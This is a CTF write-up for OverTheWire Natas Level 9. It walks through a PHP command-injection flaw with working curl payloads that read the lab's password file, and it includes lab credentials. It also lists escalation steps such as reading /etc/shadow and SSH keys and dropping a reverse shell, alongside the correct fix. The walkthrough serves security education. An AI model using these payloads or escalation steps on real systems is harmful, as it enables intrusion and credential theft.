---
title: "OverTheWire Natas Level 9 → 10: Command Injection via Unsanitised Shell Input"
description: "Natas Level 9 passes user input directly to a shell grep command. A semicolon breaks the command and lets us run anything we want as the web server."
date: 2026-06-11
platform: OverTheWire
difficulty: easy
tags: [ctf, web, natas, overthewire, command-injection, rce, php, grep]
series: "OverTheWire Natas"
order: 9
seriesLabel: "Level 9 → 10"
draft: false
---

> Part of a complete level-by-level Natas series. Each post is self-contained — if you want context on the setup and tooling, start with the [Intro & Setup](../natas-00-introduction/) post.

## Introduction

Level 9 is a command injection level — arguably the most dangerous web vulnerability class short of direct server compromise, because it gives an attacker the ability to run arbitrary operating system commands on the server. The application has a search form that runs `grep -i $key dictionary.txt` in a shell, where `$key` is the user's input with zero sanitisation. Injecting a semicolon terminates the grep command and lets us append any command we want. We use this to read the natas10 password directly from the filesystem.

Command injection at this level is clean and unfiltered — Level 10 (the next post) will add a character filter, making it slightly more interesting.

## Official Challenge Objective

> **Find words containing: [search box]** *(powered by a shell command)*

## Skills Covered

- Identifying command injection vulnerability from PHP source code
- Using `;` to chain shell commands in an injection payload
- Using `#` to comment out the remainder of the original command
- Reading arbitrary files via injected `cat` command
- Understanding shell metacharacters and their security implications

## My Approach

I read the sourcecode first. The PHP is extremely direct about what it does: `passthru("grep -i $key dictionary.txt")`. The `$key` variable comes straight from `$_POST['needle']` with no sanitisation at all. I tried a few benign searches first to confirm the grep was working normally, then crafted an injection payload using semicolons. Rather than path-traversing to the password file, I knew from earlier levels that all Natas passwords live in `/etc/natas_webpass/`, so I targeted that directly.

## Step-by-Step Walkthrough

### Command

```bash
# First: fetch the source to understand the backend
curl http://natas9:ZE1ck82lmdGIoErlhQgWND6j2Wzz6b6t@natas9.natas.labs.overthewire.org/index-source.html
```

### Explanation

The PHP source:

```php
<?
$key = "";

if(array_key_exists("needle", $_POST)) {
    $key = $_POST['needle'];
}

if($key != "") {
    passthru("grep -i $key dictionary.txt");
}
?>
```

`passthru()` is a PHP function that executes a shell command and outputs the raw result to the browser. `$key` comes directly from POST input with no sanitisation. The shell command is:

```bash
grep -i USER_INPUT dictionary.txt
```

If `USER_INPUT` contains shell metacharacters, the shell interprets them before grep sees anything. A semicolon (`;`) tells the shell "end this command, start a new one." So the payload `; cat /etc/natas_webpass/natas10 ;` turns the command into:

```bash
grep -i ; cat /etc/natas_webpass/natas10 ; dictionary.txt
```

Which the shell parses as three commands:
1. `grep -i` (incomplete but runs with an error)
2. `cat /etc/natas_webpass/natas10` (runs successfully, prints the password)
3. `dictionary.txt` (treated as a command, errors out)

The password is in the middle of the output.

### Why It Matters

`passthru()` (and its siblings `exec()`, `shell_exec()`, `system()`, backtick operators) are the functions that make command injection possible in PHP. Whenever you see these in source code, the next question is always: is the input sanitised? Here the answer is clearly no.

---

### Command

```bash
# Test that injection works with a simple ls
curl -d "needle=; ls /etc/natas_webpass/ #" -d "submit=Search" \
     http://natas9:ZE1ck82lmdGIoErlhQgWND6j2Wzz6b6t@natas9.natas.labs.overthewire.org/
```

### Explanation

Before targeting the specific file, I confirm the injection works by listing the directory. The `#` at the end is a shell comment character — it tells the shell to ignore everything after it. This handles the `dictionary.txt` tail of the original command cleanly. The injected command becomes:

```bash
grep -i ; ls /etc/natas_webpass/ # dictionary.txt
```

Which the shell reads as:
1. `grep -i` (errors)
2. `ls /etc/natas_webpass/` (succeeds)
3. `# dictionary.txt` (comment, ignored)

The output shows the full contents of `/etc/natas_webpass/`, listing password files for all natas levels. Confirming this directory exists and is readable validates the injection vector before we extract the specific password.

### Why It Matters

Confirming directory listing before extracting a file is good exploitation hygiene. If the directory did not exist or was not readable, I would need a different approach. Checking first avoids false negatives and helps map the available attack surface.

---

### Command

```bash
curl -d "needle=;cat /etc/natas_webpass/natas10;#" -d "submit=Search" \
     http://natas9:ZE1ck82lmdGIoErlhQgWND6j2Wzz6b6t@natas9.natas.labs.overthewire.org/
```

### Explanation

Final payload: `;cat /etc/natas_webpass/natas10;#`

The injected shell command becomes:

```bash
grep -i ;cat /etc/natas_webpass/natas10;# dictionary.txt
```

Shell parsing:
1. `grep -i` — runs, errors (no pattern argument), but that is fine
2. `cat /etc/natas_webpass/natas10` — runs, outputs the file contents
3. `# dictionary.txt` — comment, shell ignores it

The response page output includes the content of the password file:

```
t7I5VHvpa14sJTUGV0cbEsbYfFP2dmOu
```

The natas10 password is `t7I5VHvpa14sJTUGV0cbEsbYfFP2dmOu`.

### Why It Matters

Semicolons and hash/pound signs are the two most important shell metacharacters for command injection. Semicolons chain commands sequentially. `#` makes the shell ignore the rest of the line. Together they let you insert a complete, clean command into the middle of an existing shell string.

---

### Command

```bash
# Bonus: confirm by trying a payload that also works without the trailing semicolon
curl -d "needle=;cat /etc/natas_webpass/natas10 #" -d "submit=Search" \
     http://natas9:ZE1ck82lmdGIoErlhQgWND6j2Wzz6b6t@natas9.natas.labs.overthewire.org/
```

### Explanation

Space before `#` also works. The `#` begins a comment only when it is at the start of a word (preceded by whitespace or the beginning of the command). Both forms are equivalent in this context.

### Why It Matters

Understanding the precise shell rules for metacharacter interpretation matters when you hit filters. If `;` is filtered but `\n` or `||` or `&&` is not, you need to know which alternatives achieve the same goal — that knowledge comes from understanding why the basic form works.

## Deep Dive: Cyber Security Concept

**Command injection — user input that becomes operating system commands.**

Command injection is classified as Injection (OWASP A03:2021) and is among the most critical web vulnerabilities because successful exploitation gives an attacker arbitrary command execution on the server. The impact is not limited to reading files: the attacker can create reverse shells, exfiltrate data, pivot to internal networks, install persistence mechanisms, and destroy data.

The vulnerability exists because the application treats data (user input) as code (a shell command fragment). Shell metacharacters — characters that the shell interprets as syntax rather than data — are the vector:

- `;` — command separator, runs the next command regardless of the previous one's exit code
- `&&` — conditional separator, runs the next command only if the previous succeeded
- `||` — conditional separator, runs the next command only if the previous failed
- `|` — pipe, passes the output of one command to the input of the next
- `` ` `` and `$()` — command substitution, runs a command and substitutes its output inline
- `\n` (`%0A`) — newline, ends the current command and starts a new one

The correct fix is to never construct shell commands from user input. If you must run a system command, use `escapeshellarg()` / `escapeshellcmd()` in PHP (they add proper quoting), or better yet, call the system function directly from the programming language without invoking a shell at all (e.g., PHP's `pcntl_exec`, Python's `subprocess.run` with a list argument).

> [!IMPORTANT]
> Never concatenate user input into shell commands without proper sanitisation and escaping. The safest approach is to avoid invoking a shell at all: call the underlying function (grep, convert, etc.) directly from your language's API rather than constructing a shell string. If a shell is unavoidable, use your language's shell-escaping functions and apply allowlist validation on the input.

## Offensive Security Perspective

Command injection is a top-priority test case in every web application pentest. The testing methodology:

1. Identify parameters that feed into operating system operations (search fields, file conversion forms, DNS/ping utilities, report generation).
2. Inject shell metacharacters one at a time and observe response differences: `;`, `&&`, `|`, backtick, `$()`.
3. If basic injection works, escalate: read `/etc/passwd`, check `id` (to see which user the web server runs as), check `whoami`, check network connectivity with `curl` or `wget` for potential reverse shell.
4. If reading files, go for high-value targets: `/etc/shadow`, SSH keys, application config files, environment variables.
5. If network access exists, drop a reverse shell.

Burp Suite's Active Scanner and tools like `commix` automate command injection detection and exploitation. But manual testing for this class of vulnerability is more reliable because automated tools miss context-specific triggers.

## Common Beginner Mistakes

- Forgetting that `$key` needs a `;` before the injected command to terminate the grep call.
- Not including `#` at the end and letting the original `dictionary.txt` argument corrupt the payload.
- URL-encoding the semicolon unnecessarily when the form submission already handles URL encoding.
- Trying complex payloads before confirming basic injection with something simple like `; id #`.
- Not checking what other files are accessible once injection is confirmed.

## Key Takeaways

- `passthru("grep -i $key dictionary.txt")` with unfiltered `$key` is textbook command injection — the shell processes metacharacters in the input.
- Semicolons chain shell commands; `#` comments out the rest of the line — together they isolate an injected command cleanly.
- Start with simple confirmation payloads (`; id #`, `; ls /tmp #`) before targeting specific files.
- All natas passwords are in `/etc/natas_webpass/natasX` — this is a consistent convention throughout the series.
- Command injection is High/Critical severity because it can escalate to full server compromise, not just file reads.

## How This Helps Build Cyber Security Expertise

- **Command injection testing:** this is a mandatory test case on every web application engagement; recognising vulnerable patterns (passthru, exec, system with user input) is a core skill.
- **Shell scripting security:** understanding how the shell interprets metacharacters teaches secure shell scripting practices and helps identify injection points in legacy codebases.
- **Post-exploitation escalation:** command injection is often the bridge between web application compromise and OS-level access; understanding the escalation path is critical for assessing real-world risk.
- **OWASP A03:2021 Injection:** command injection is the most severe subclass; this level builds the foundational understanding for SQLi, LDAP injection, and other injection variants.

## Additional Reading

- [OWASP — Command Injection](https://owasp.org/www-community/attacks/Command_Injection)
- [OWASP Testing Guide — Testing for Command Injection](https://owasp.org/www-project-web-security-testing-guide/latest/4-Web_Application_Security_Testing/07-Input_Validation_Testing/12-Testing_for_Command_Injection)
- [PortSwigger — OS command injection](https://portswigger.net/web-security/os-command-injection)
- [commix — automated command injection tool](https://github.com/commixproject/commix)

---

## Connect with the Author

Written by **Himangshu Pan** — cybersecurity researcher.

- **GitHub:** [@0xSh3ru](https://github.com/0xSh3ru)
- **LinkedIn:** [in/0xsh3ru](https://www.linkedin.com/in/0xsh3ru/)

*If this walkthrough helped, follow along on GitHub and connect on LinkedIn — questions and corrections are always welcome.*
